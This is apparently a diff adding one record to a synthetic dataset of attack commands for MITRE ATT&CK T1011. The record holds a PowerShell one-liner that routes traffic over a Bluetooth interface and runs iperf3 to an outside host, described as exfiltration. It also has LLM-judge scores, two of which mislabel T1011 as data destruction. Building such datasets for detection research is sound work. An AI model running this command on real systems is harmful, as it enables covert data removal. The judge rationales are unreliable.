@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$route='172.31.199.2'; $bt=Get-NetAdapter -Name 'Bluetooth Network Connection' -ErrorAction Stop; $gw=(Get-NetIPConfiguration -InterfaceIndex $bt.ifIndex).IPv4DefaultGateway.NextHop; if($gw){cmd /c \"route add $route mask 255.255.255.255 $gw metric 5 if $($bt.ifIndex)\"}; $lip=(Get-NetIPAddress -InterfaceIndex $bt.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c $route -p 55777 -B $lip -t 60",
+  "explanation": "Adds a host route via the Bluetooth PAN gateway to force traffic over the Bluetooth medium, then runs iperf3 bound to that interface to exfiltrate over TCP on an uncommon port (T1011).",
+  "rationale_steps": [
+    "Determine Bluetooth PAN interface and its default gateway.",
+    "Add a specific host route so only the exfil server traffic uses Bluetooth.",
+    "Bind iperf3 to the Bluetooth address and use a high TCP port.",
+    "Limit impact by scoping the route to a single destination."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-9a2e4ef2",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with proper variable assignments, error handling, conditional logic, balanced parentheses/braces, and correct command chaining using semicolons.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements exfiltration over an alternative protocol (T1011) by routing traffic through Bluetooth and using iperf3 for data transfer, though it focuses on network configuration rather than actual data destruction as described in the technique.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:34:19.614295Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed for PowerShell, with correct variable assignments, cmdlet usage, string interpolation, and executable calls.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs network route manipulation and runs a network performance test with iperf3, which has no semantic alignment with T1011 Data Destruction; it is completely unrelated to destroying data.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:34:24.905319Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting, proper statement separators, and valid use of cmd route and iperf3 arguments.",
+        "semantic_score": 4,
+        "semantic_justification": "It adds a host route via the Bluetooth interface and binds iperf3 to that IP to force traffic over Bluetooth, but route addition typically requires admin privileges and iperf3 does not exfiltrate arbitrary data, slightly reducing realism.",
+        "combined_score": 4.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T02:35:07.356716Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
